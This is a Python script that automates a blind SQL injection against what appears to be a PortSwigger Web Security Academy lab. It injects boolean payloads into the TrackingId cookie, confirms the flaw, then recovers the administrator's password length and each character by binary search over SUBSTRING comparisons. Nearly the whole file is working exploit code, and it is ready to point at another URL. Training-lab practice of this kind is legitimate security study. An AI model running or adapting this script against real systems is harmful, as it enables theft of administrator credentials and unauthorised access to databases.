import string
import requests

# ==================== CONFIGURATION (CHANGE PER LAB) ====================
LAB_URL = "https://0a2700a6042b16ca80823531005f00b8.web-security-academy.net/"
BASE_TRACKING_ID = "CKdeSVOnOWRwQmJ1"
SESSION_COOKIE = "DMmkDPivpu0Pp1HQNRNwK4Cnp69tApDi"
SUCCESS_INDICATOR = "Welcome back!"
# ========================================================================

# Clean host extraction for headers
HOST = LAB_URL.replace("https://", "").replace("http://", "").rstrip("/")

headers = {
    "Host": HOST,
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
        " Chrome/154.0.0.0 Safari/537.36"
    ),
    "Origin": LAB_URL.rstrip("/"),
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
}


def send_request(tracking_payload):
  """Sends a request with the modified TrackingId cookie and returns True if the success condition is met."""
  cookies = {
      "TrackingId": BASE_TRACKING_ID + tracking_payload,
      "session": SESSION_COOKIE,
  }
  try:
    response = requests.get(
        LAB_URL, headers=headers, cookies=cookies, timeout=10
    )
    return SUCCESS_INDICATOR in response.text
  except requests.exceptions.RequestException as e:
    print(f"[-] Request error: {e}")
    return False


def test_vulnerability():
  """Step 1: Test if the application is vulnerable using true/false conditions."""
  print("[*] Testing for Blind SQL Injection vulnerability...")
  true_cond = send_request("' AND '1'='1")
  false_cond = send_request("' AND '1'='2")

  if true_cond and not false_cond:
    print("[+] Application is vulnerable to Blind SQL Injection!")
    return True
  else:
    print("[-] Vulnerability check failed. Conditions returned identical states.")
    return False


def get_password_length():
  """Step 2: Find the length of the administrator's password."""
  print("[*] Finding administrator password length...")
  for length in range(1, 50):
    payload = f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')={length}--"
    if send_request(payload):
      print(f"[+] Password length found: {length}")
      return length
  print("[-] Could not determine password length.")
  return 0


def extract_password_binary(length):
  """Step 3: Extract the password character by character using binary search."""
  print(
      "[*] Extracting administrator password using Binary Search (O(log n))"
      "..."
  )

  # Sorted character set for alphabetical comparison (> and =)
  chars = sorted(
      string.ascii_lowercase + string.digits + string.ascii_uppercase
  )
  password = ""

  for i in range(1, length + 1):
    low = 0
    high = len(chars) - 1
    char_found = None

    while low <= high:
      mid = (low + high) // 2
      guess_char = chars[mid]

      # Test if the character at position i is alphabetically greater than guess_char
      payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator') > '{guess_char}'--"

      if send_request(payload):
        # Character is greater, search the right half
        low = mid + 1
      else:
        # Character is less than or equal to guess_char. Let's verify if it equals guess_char.
        eq_payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator') = '{guess_char}'--"
        if send_request(eq_payload):
          char_found = guess_char
          break
        else:
          # Character is strictly less than guess_char, search the left half
          high = mid - 1

    if char_found:
      password += char_found
      print(f"[+] Progress: {password}")
    else:
      print(f"[-] Could not find character at position {i}")
      break

  return password


if __name__ == "__main__":
  if test_vulnerability():
    password_length = get_password_length()
    if password_length > 0:
      admin_password = extract_password_binary(password_length)
      print(f"\n[+] SUCCESS! Administrator password is: {admin_password}")
    else:
      print("[-] Exiting due to unknown password length.")
  else:
    print("[-] Exiting: Target is not vulnerable or cookies/URL are incorrect.")
